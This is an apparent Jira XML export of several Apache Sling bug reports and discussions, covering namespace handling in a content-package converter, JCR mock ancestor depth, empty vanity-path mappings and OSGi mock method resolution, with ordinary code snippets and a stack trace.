                            <comment id="17720504" author="kwin" created="Mon, 8 May 2023 13:15:36 +0000"  >&lt;p&gt;Can you add the IT in a PR? Then I can have a look.&lt;/p&gt;</comment>
                            <comment id="17720506" author="kwin" created="Mon, 8 May 2023 13:19:27 +0000"  >&lt;p&gt;In general we don&apos;t have access to a repository in cp2fm, therefore we use a JCR Namespace Registry populated from JCR default as well as the values provided in the Bundle Manifest Header &lt;tt&gt;Sling-Namespaces&lt;/tt&gt;. In addition every namespace defined in a repoinit config is considered. IMHO that IT uses just an undefined namespace prefix (which may be supported by Sling in a best effort basis) but is invalid for DocView XML (&lt;a href=&quot;https://developer.adobe.com/experience-manager/reference-materials/spec/jcr/2.0/7_Export.html#7.3%20Document%20View&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://developer.adobe.com/experience-manager/reference-materials/spec/jcr/2.0/7_Export.html#7.3%20Document%20View&lt;/a&gt;)&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;For every namespace used within the subgraph rooted at N, the corresponding JCR namespace mapping in the current session is included in the exported document such that any use of the namespace prefix in the exported document is within the scope of the appropriate namespace declaration&lt;/p&gt;&lt;/blockquote&gt;</comment>
                            <comment id="17720511" author="rombert" created="Mon, 8 May 2023 13:33:28 +0000"  >&lt;p&gt;Thanks for looking into this &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;. See &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/168&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/168&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17720515" author="rombert" created="Mon, 8 May 2023 14:00:58 +0000"  >&lt;p&gt;The new unit test + the old codebase generate the following namespace declarations&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;jcr:root xmlns=&lt;span class=&quot;code-quote&quot;&gt;&quot;&quot; &lt;span class=&quot;code-keyword&quot;&gt;xmlns:nt&lt;/span&gt;=&quot;&lt;/span&gt;http://www.jcp.org/jcr/nt/1.0&lt;span class=&quot;code-quote&quot;&gt;&quot; &lt;span class=&quot;code-keyword&quot;&gt;xmlns:xml&lt;/span&gt;=&quot;&lt;/span&gt;http://www.w3.org/XML/1998/namespace&lt;span class=&quot;code-quote&quot;&gt;&quot; &lt;span class=&quot;code-keyword&quot;&gt;xmlns:oak&lt;/span&gt;=&quot;&lt;/span&gt;http://jackrabbit.apache.org/oak/ns/1.0&lt;span class=&quot;code-quote&quot;&gt;&quot; &lt;span class=&quot;code-keyword&quot;&gt;xmlns:jcr&lt;/span&gt;=&quot;&lt;/span&gt;http://www.jcp.org/jcr/1.0&lt;span class=&quot;code-quote&quot;&gt;&quot; &lt;span class=&quot;code-keyword&quot;&gt;xmlns:rep&lt;/span&gt;=&quot;&lt;/span&gt;internal&lt;span class=&quot;code-quote&quot;&gt;&quot; &lt;span class=&quot;code-keyword&quot;&gt;xmlns:my&lt;/span&gt;=&quot;&lt;/span&gt;http://namespace.com/my&lt;span class=&quot;code-quote&quot;&gt;&quot; &lt;span class=&quot;code-keyword&quot;&gt;xmlns:mix&lt;/span&gt;=&quot;&lt;/span&gt;http://www.jcp.org/jcr/mix/1.0&lt;span class=&quot;code-quote&quot;&gt;&quot; &lt;span class=&quot;code-keyword&quot;&gt;xmlns:sling&lt;/span&gt;=&quot;&lt;/span&gt;http://sling.apache.org/jcr/sling/1.0&lt;span class=&quot;code-quote&quot;&gt;&quot; &lt;span class=&quot;code-keyword&quot;&gt;xmlns:vlt&lt;/span&gt;=&quot;&lt;/span&gt;http://www.day.com/jcr/vault/1.0&lt;span class=&quot;code-quote&quot;&gt;&quot; jcr:primaryType=&quot;&lt;/span&gt;nt:unstructured&lt;span class=&quot;code-quote&quot;&gt;&quot; description=&quot;&lt;/span&gt;{String}This node has been created by a sling bundle.&lt;span class=&quot;code-quote&quot;&gt;&quot; title=&quot;&lt;/span&gt;{String}My first node&quot;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The JCR ContentLoader will happily process this, given that the right namespaces are present in the repository.&lt;/p&gt;</comment>
                            <comment id="17720569" author="kwin" created="Mon, 8 May 2023 15:57:15 +0000"  >&lt;blockquote&gt;&lt;p&gt;The JCR ContentLoader will happily process this, given that the right namespaces are present in the repository.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The package containing that DocView is processed by the FileVault importer, not the JCR content loader. The JCR content loader acts on the source XML file format defined in &lt;a href=&quot;https://sling.apache.org/documentation/bundles/content-loading-jcr-contentloader.html#xml-descriptor-files&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sling.apache.org/documentation/bundles/content-loading-jcr-contentloader.html#xml-descriptor-files&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17720571" author="reschke" created="Mon, 8 May 2023 16:02:40 +0000"  >&lt;p&gt;FWIW, I would &lt;b&gt;expect&lt;/b&gt; Oak&apos;s DocView import to fail for that content. Maybe worth a test case just to be sure.&lt;/p&gt;</comment>
                            <comment id="17720577" author="kwin" created="Mon, 8 May 2023 16:17:44 +0000"  >&lt;blockquote&gt;&lt;p&gt;FWIW, I would expect Oak&apos;s DocView import to fail for that content. Maybe worth a test case just to be sure.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;This is imported by FileVault (leveraging individual setProperty/createNode calls) not with simple JCR DocView import.&lt;/p&gt;</comment>
                            <comment id="17720578" author="reschke" created="Mon, 8 May 2023 16:20:02 +0000"  >&lt;p&gt;Understood. But I still think it would be good to have test coverage for this (if not already present).&lt;/p&gt;</comment>
                            <comment id="17722217" author="rombert" created="Fri, 12 May 2023 15:42:28 +0000"  >&lt;p&gt;Not going ahead with this for now. It is indeed possible to provide default mappings, in case the bundle does not have them. An example (when embedding the converter via the Java API) is at &lt;a href=&quot;https://github.com/adobe/aemanalyser-maven-plugin/pull/205/commits/7454c25f0360624e8bcd72c740785ed55b49d94a&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/adobe/aemanalyser-maven-plugin/pull/205/commits/7454c25f0360624e8bcd72c740785ed55b49d94a&lt;/a&gt; .&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13468524">SLING-11421</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hr8g:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11863] AbstractItem#getAncestor interprets the depth argument incorrectly</title>
                <link>https://issues.apache.org/jira/browse/SLING-11863</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The &lt;a href=&quot;https://javadoc.io/static/javax.jcr/jcr/2.0/javax/jcr/Item.html#getAncestor(int)&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;javadocs&lt;/a&gt; for &quot;Item javax.jcr.Item.getAncestor(int depth)&quot; describes the depth argument as:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
depth = 0 returns the root node of a workspace.
depth = 1 returns the child of the root node along the path to &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt; Item.
depth = 2 returns the grandchild of the root node along the path to &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt; Item.
And so on to depth = n, where n is the depth of &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt; Item, which returns &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt; Item itself.&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, the org.apache.sling.testing.mock.jcr.AbstractItem#getAncestor implementation is using &quot;ResourceUtil.getParent(getPath(), depth)&quot; which interprets the second argument as:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
level = 0 returns the path.
level = 1 returns the parent of path, &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; it exists, &lt;span class=&quot;code-keyword&quot;&gt;null&lt;/span&gt; otherwise.
level = 2 returns the grandparent of path, &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; it exists, &lt;span class=&quot;code-keyword&quot;&gt;null&lt;/span&gt; otherwise.&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Expected:&lt;/p&gt;

&lt;p&gt;AbstractItem#getAncestor should resolve the ancestor path as the item depth minus the supplied depth argument.&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.session.getItem(ResourceUtil.getParent(getPath(), getDepth() - depth));&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13535284">SLING-11863</key>
            <summary>AbstractItem#getAncestor interprets the depth argument incorrectly</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Sat, 6 May 2023 22:43:52 +0000</created>
                <updated>Fri, 19 May 2023 10:40:29 +0000</updated>
                            <resolved>Wed, 10 May 2023 18:28:49 +0000</resolved>
                                                    <fixVersion>Testing JCR Mock 1.6.10</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17721506" author="enorman" created="Wed, 10 May 2023 18:28:49 +0000"  >&lt;p&gt;Merged PR at: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-jcr-mock/commit/11453f2469039de7849dce59e51014153001d077&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;11453f2&lt;/tt&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 24 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hqo0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11861]  ResourceMapper.getAllMappings returns empty mapping &quot;&quot; when a vanity paths is pathless url</title>
                <link>https://issues.apache.org/jira/browse/SLING-11861</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When a resource has a path less url as vanity path (eg: &quot;http://www.example.com&quot;) ResourceMapper.getAllMappings returns mappings consisting of an empty path &quot;&quot;.&lt;/p&gt;

&lt;p&gt;This &quot;&quot; mapping can make &lt;tt&gt;AuthenticationRequirementsManager&lt;/tt&gt; stop listening to further authentication requirements &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
Exception in thread &lt;span class=&quot;code-quote&quot;&gt;&quot;pool-14-thread-1&quot;&lt;/span&gt; java.lang.IllegalArgumentException: Configuration must not be null or empty
	at org.apache.sling.auth.core.impl.AuthenticationRequirementHolder.fromConfig(AuthenticationRequirementHolder.java:30)
	at org.apache.sling.auth.core.impl.AuthenticationRequirementsManager.addService(AuthenticationRequirementsManager.java:374)
	at org.apache.sling.auth.core.impl.AuthenticationRequirementsManager.process(AuthenticationRequirementsManager.java:300)
	at org.apache.sling.auth.core.impl.AuthenticationRequirementsManager.processQueue(AuthenticationRequirementsManager.java:281)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at java.base/java.lang.Thread.run(Thread.java:834)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Clarification required:&lt;/p&gt;
&lt;ul class=&quot;alternate&quot; type=&quot;square&quot;&gt;
	&lt;li&gt;Is &quot;&quot; mapping/path a valid path? Should we store and return vanity path as &quot;/&quot; in case of pathless url as vanity path?&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;cc: &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt;&lt;/p&gt;


&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-auth-core/blob/org.apache.sling.auth.core-1.5.0/src/main/java/org/apache/sling/auth/core/impl/SlingAuthenticatorServiceListener.java#L345-L351&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-auth-core/blob/org.apache.sling.auth.core-1.5.0/src/main/java/org/apache/sling/auth/core/impl/SlingAuthenticatorServiceListener.java#L345-L351&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13535106">SLING-11861</key>
            <summary> ResourceMapper.getAllMappings returns empty mapping &quot;&quot; when a vanity paths is pathless url</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="2">Won&apos;t Fix</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="sagarmiglani">Sagar Miglani</reporter>
                        <labels>
                    </labels>
                <created>Fri, 5 May 2023 07:14:16 +0000</created>
                <updated>Wed, 10 May 2023 05:54:59 +0000</updated>
                            <resolved>Wed, 10 May 2023 05:54:59 +0000</resolved>
                                    <version>Resource Resolver 1.10.0</version>
                                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17719702" author="sagarmiglani" created="Fri, 5 May 2023 07:20:45 +0000"  >&lt;p&gt;Potential changes: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/96&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/96&lt;/a&gt;&#160;&lt;/p&gt;</comment>
                            <comment id="17719715" author="reschke" created="Fri, 5 May 2023 07:37:24 +0000"  >&lt;p&gt;Not convinced.&lt;/p&gt;

&lt;p&gt;This is a change in behavior that could possibly cause breakage elsewhere (that&apos;s why we improved test coverage after all).&lt;/p&gt;

&lt;p&gt;IMHO this needs to be fixed in the consumers of the API.&lt;/p&gt;</comment>
                            <comment id="17719734" author="sagarmiglani" created="Fri, 5 May 2023 08:19:10 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt; I believe it is a missed edge case at resourceresolver side, in case of URL based vanity paths.&lt;/p&gt;

&lt;p&gt;IMO empty path/mapping &quot;&quot; does not make any sense. I&apos;m not sure if we are allowed to add &quot;&quot; vanity path, but if API doesn&apos;t allow to add why it returns an &quot;&quot;?&lt;/p&gt;

&lt;p&gt;But if you think this is incorrect please feel free to close the PR as well as this ticket, Thanks!&lt;/p&gt;

&lt;p&gt;BTW, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; and &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; what is you opinion on this?&lt;/p&gt;</comment>
                            <comment id="17721196" author="sagarmiglani" created="Wed, 10 May 2023 05:54:59 +0000"  >&lt;p&gt;Marking this as won&apos;t fix, as suggestion here and in PR is to handle it at caller&apos;s side instead of changing the ResouceMapper&apos;s behaviour which might have unknown outcomes and is risky to change.&lt;br/&gt;
Created &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11867&quot; title=&quot;Empty mapping from ResourceMapper breaks authentication requirement updates&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11867&quot;&gt;&lt;del&gt;SLING-11867&lt;/del&gt;&lt;/a&gt; to handle this on Sling auth core side&lt;/p&gt;

&lt;p&gt;cc: &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;&#160;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13535591">SLING-11867</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 24 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hpkg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11860] OsgiServiceUtil may invoke the wrong method</title>
                <link>https://issues.apache.org/jira/browse/SLING-11860</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Impacts both the activate/deactivate methods and the bind/unbind methods&lt;/p&gt;

&lt;p&gt;The scenario where this happens is when the parent class has an activate/deactivate/bind/unbind method with one set of arguments&#160; and the subclass has an activate/deactivate/bind/unbind method with the same name but with a different set of arguments.&lt;/p&gt;

&lt;p&gt;For example, when the context.registerInjectActivateService(..) call is invoked,&#160; it finds the activate(Map) method from the parent class and invokes it and then returns instead of calling the more specific activate(Config) methods from the subclass.&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;ParentComponent {

&#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;protected&lt;/span&gt; void activate(Map&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;code-object&quot;&gt;Object&lt;/span&gt;&amp;gt; props) {
&#160; &#160; &#160; &#160; &lt;span class=&quot;code-comment&quot;&gt;// &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt; should not be invoked when activating SubComponent
&lt;/span&gt;&#160; &#160; }

}

@Component
@Designate(ocd=SubComponent.Config.class)
&lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;SubComponent &lt;span class=&quot;code-keyword&quot;&gt;extends&lt;/span&gt; ParentComponent {

&#160; &#160; @ObjectClassDefinition(name = &lt;span class=&quot;code-quote&quot;&gt;&quot;SubComponent Config&quot;&lt;/span&gt;)
&#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; @&lt;span class=&quot;code-keyword&quot;&gt;interface&lt;/span&gt; Config {
&#160; &#160; &#160; &#160; @AttributeDefinition(name = &lt;span class=&quot;code-quote&quot;&gt;&quot;Prop One&quot;&lt;/span&gt;)
&#160; &#160; &#160; &#160; &lt;span class=&quot;code-object&quot;&gt;boolean&lt;/span&gt; prop1() &lt;span class=&quot;code-keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;true&lt;/span&gt;;
&#160; &#160; }

  &#160; @Activate
&#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;protected&lt;/span&gt; void activate(Config cfg) {
&#160; &#160; &#160; &#160; &lt;span class=&quot;code-comment&quot;&gt;// should be invoked when activating
&lt;/span&gt;&#160; &#160; }

} &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13535078">SLING-11860</key>
            <summary>OsgiServiceUtil may invoke the wrong method</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Fri, 5 May 2023 03:33:55 +0000</created>
                <updated>Fri, 19 May 2023 10:40:47 +0000</updated>
                            <resolved>Wed, 10 May 2023 19:37:20 +0000</resolved>
                                                    <fixVersion>Testing OSGi Mock 3.3.8</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
